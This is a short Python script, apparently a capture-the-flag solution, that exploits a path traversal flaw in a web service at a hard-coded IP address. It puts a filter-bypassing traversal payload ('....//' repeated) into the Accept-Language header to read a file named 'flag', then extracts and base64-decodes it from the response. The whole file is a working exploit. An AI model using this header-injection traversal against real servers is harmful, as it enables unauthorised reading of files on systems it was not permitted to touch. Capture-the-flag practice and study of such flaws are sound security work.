import base64
import requests

url = "http://35.207.132.47:84/"
headers = {"Accept-Language": "....//....//....//....//....//....//....//....//flag"}
r = requests.get(url, headers=headers)
encoded = r.text.split("base64,")[-1].split('">')[0]
flag = base64.b64decode(encoded).decode("ascii").strip()
print(flag)
